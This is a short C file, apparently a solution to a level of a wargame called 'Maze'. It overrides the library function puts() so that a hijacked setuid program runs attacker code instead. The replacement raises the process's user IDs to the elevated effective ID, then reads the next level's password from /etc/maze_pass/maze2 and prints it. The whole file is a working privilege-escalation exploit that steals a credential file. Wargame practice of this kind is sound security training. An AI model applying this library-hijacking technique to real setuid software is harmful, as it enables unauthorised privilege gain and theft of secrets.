#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#define _GNU_SOURCE
int puts(const char *str)
{
    int ret = setresuid(geteuid(), geteuid(), geteuid());
    printf("Setresuid returned %d\n", ret);
    FILE *f = fopen("/etc/maze_pass/maze2", "r");
    char buf[100];
    fscanf(f, "%s", buf);
    printf("Password: %s\n", buf);
    return 0;
}
